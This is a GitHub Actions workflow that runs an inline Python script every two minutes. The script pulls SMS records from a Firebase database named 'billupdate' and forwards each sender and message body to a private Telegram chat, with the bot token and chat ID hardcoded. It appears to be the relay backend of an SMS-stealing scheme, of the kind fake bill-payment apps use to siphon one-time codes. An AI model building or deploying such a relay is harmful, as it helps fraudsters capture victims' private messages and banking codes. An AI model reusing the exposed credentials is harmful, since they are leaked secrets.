name: SMS to Telegram Forwarder

on:
  schedule:
    - cron: '*/2 * * * *'  # Har 2 minute me check
  workflow_dispatch:

jobs:
  check-sms:
    runs-on: ubuntu-latest
    
    steps:
      - name: Install Python dependencies
        run: |
          pip install requests
          
      - name: Check and Send SMS
        env:
          FIREBASE_URL: 'https://billupdate-2c426-default-rtdb.asia-southeast1.firebasedatabase.app'
          BOT_TOKEN: '6854542102:AAH7zpx9_Jt8H4W-jEAFj-0eQ0hz3gX2N-M'
          CHAT_ID: '194289567'
        run: |
          echo "ğŸš€ Starting SMS check..."
          
          # Python script to check and send
          python3 -c "
import requests
import json
import os
from datetime import datetime

FIREBASE_URL = os.environ.get('FIREBASE_URL')
BOT_TOKEN = os.environ.get('BOT_TOKEN')
CHAT_ID = os.environ.get('CHAT_ID')

print(f'ğŸ” Checking Firebase: {FIREBASE_URL}')

try:
    # Get unread messages
    response = requests.get(f'{FIREBASE_URL}/messages.json?orderBy=\"telegram_sent\"&equalTo=null&limitToLast=5')
    
    if response.status_code == 200:
        data = response.json()
        
        if data and data != 'null':
            print(f'âœ… Found {len(data)} new messages')
            
            for msg_id, msg in data.items():
                if msg and isinstance(msg, dict):
                    print(f'ğŸ“± Processing: {msg_id}')
                    
                    # Create Telegram message
                    telegram_msg = f'''ğŸš¨ NEW SMS RECEIVED

ğŸ“ From: {msg.get('sender', 'Unknown')}
ğŸ“ Message: {msg.get('message', 'No message')}
â° Time: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
ğŸ†” ID: {msg_id}'''
                    
                    # Send to Telegram
                    telegram_response = requests.post(
                        f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
                        json={
                            'chat_id': CHAT_ID,
                            'text': telegram_msg,
                            'parse_mode': 'Markdown'
                        }
                    )
                    
                    if telegram_response.status_code == 200:
                        print(f'   âœ… Telegram: Sent')
                        
                        # Mark as sent in Firebase
                        mark_response = requests.patch(
                            f'{FIREBASE_URL}/messages/{msg_id}.json',
                            json={'telegram_sent': True, 'sent_at': int(datetime.now().timestamp()*1000)}
                        )
                        
                        if mark_response.status_code == 200:
                            print(f'   âœ… Firebase: Marked')
                        else:
                            print(f'   âš ï¸ Firebase Error: {mark_response.text}')
                    else:
                        print(f'   âŒ Telegram Error: {telegram_response.text}')
                else:
                    print(f'   âš ï¸ Invalid message format')
        else:
            print('ğŸ“­ No new messages found')
    else:
        print(f'âŒ Firebase error: {response.status_code} - {response.text}')
        
except Exception as e:
    print(f'ğŸ”¥ Critical error: {str(e)}')
    import traceback
    traceback.print_exc()
          "
          
          echo "âœ… Check completed at $(date)"
